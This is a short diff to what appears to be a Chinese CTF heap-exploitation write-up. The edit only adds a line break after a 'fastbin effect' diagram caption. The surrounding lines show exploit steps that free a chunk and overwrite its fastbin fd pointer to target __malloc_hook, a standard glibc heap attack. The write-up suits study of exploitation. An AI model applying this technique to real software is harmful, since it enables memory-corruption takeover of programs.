@@ -147,7 +147,7 @@ delete(0)#free(chunk2)
 malloc_hook=main_arena-0x23-0x10
 new(0xa8,'E'*0x90+p64(0) + p64(0x70) + p64(malloc_hook))#new(chunk1)，写chunk2的fd
 ```
-fastbin效果图
+fastbin效果图<br>
 ![r1](img/r1.PNG)<br>
 ![place+change](img/place+change.PNG)<br>
 
